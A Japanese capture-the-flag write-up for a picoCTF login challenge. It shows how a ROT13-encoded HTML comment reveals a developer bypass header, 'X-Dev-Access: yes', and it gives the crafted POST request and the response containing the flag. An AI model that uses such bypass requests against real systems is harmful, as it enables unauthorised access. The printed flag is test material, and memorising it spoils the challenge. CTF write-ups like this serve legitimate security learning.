
# 問題
> Description<br>
> We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?<br>
> The website is running here. Can you try to log in?

説明<br>
現在、調査中です。調査対象者の1人であるctf playerが、制限付きウェブポータル内に機密データを隠している疑いがあります。ログインに使用しているメールアドレスはctf-player@picoctf.orgであることが判明しました。残念ながらパスワードは不明で、通常の推測手法も効果がありませんでした。しかし、何かがおかしい…まるで開発者が秘密の侵入経路を残したかのようです。その経路を解明できますか？

ウェブサイトはこちらで稼働しています。ログインを試していただけますか？

# 解法要約
アクセス、メモ残ってる、シーザー、バイパスがある、ヘッダー追加でアクセス、フラグゲット

# 解法
Burpを使う場合(curlでも可能)

まず、アクセスすると以下が帰ってくる

``` js
HTTP/1.1 200 OK
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 26 Sep 2025 18:10:10 GMT
ETag: W/"ae0-1998737dfd0"
Content-Type: text/html; charset=UTF-8
Content-Length: 2784
Date: Wed, 22 Apr 2026 02:10:22 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #eaeaed;
            font-family: Arial, sans-serif;
        }

        #loginForm {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }

        #loginForm label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }

        #loginForm input {
            width: calc(100% - 10px);
            padding: 8px;
            margin-bottom: 16px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        #loginForm button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            border: none;
            color: white;
            border-radius: 4px;
            font-size: 16px;
        }

        #loginForm button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
 <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->   

    <form id="loginForm">
        <h2 style="font-size: 24px; margin-bottom: 24px;">
            Login
        </h2>
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br>
        <button type="submit">Login</button>
    </form>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const formData = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value
            };

            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(formData)
            })
            .then(response => response.json())
            .then(data => {
                console.log(data);
                if (data.success) {
    prompt('Login successful!\nFlag:', data.flag);
} else {
    alert('Invalid credentials');
}

            })
            .catch(error => console.error('Error:', error));
        });
    </script>

</body>
</html>
```
68行目になんか書いてある

``` js
......
<body>
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->   
......
```

メモの消し忘れらしい、いったんシーザー暗号してみる
``` Text
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```

13回回すとこれらしい<br>
バイパス(運営用の隠し道)があるらしいからヘッダーに追加してリクエストをBurpで送る

因みにリクエストを送る時のxx:xxがヘッダー、{"xx":"xx"}がボディ

``` js
POST /login HTTP/1.1
Host: amiable-citadel.picoctf.net:61972
Content-Length: 49
Accept-Language: ja
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://amiable-citadel.picoctf.net:61972
Referer: http://amiable-citadel.picoctf.net:61972/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
X-Dev-Access: yes

{"email":"ctf-player@picoctf.org","password":"a"}
```

送るときは https をオフにして、ポートは61972で送る


``` js
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 127
ETag: W/"7f-OXFNNEgUDQ6luMcdemqCj4aTy9o"
Date: Wed, 22 Apr 2026 02:22:05 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_7e5db33b}"}
```

解答<br>
picoCTF{brut4_f0rc4_7e5db33b}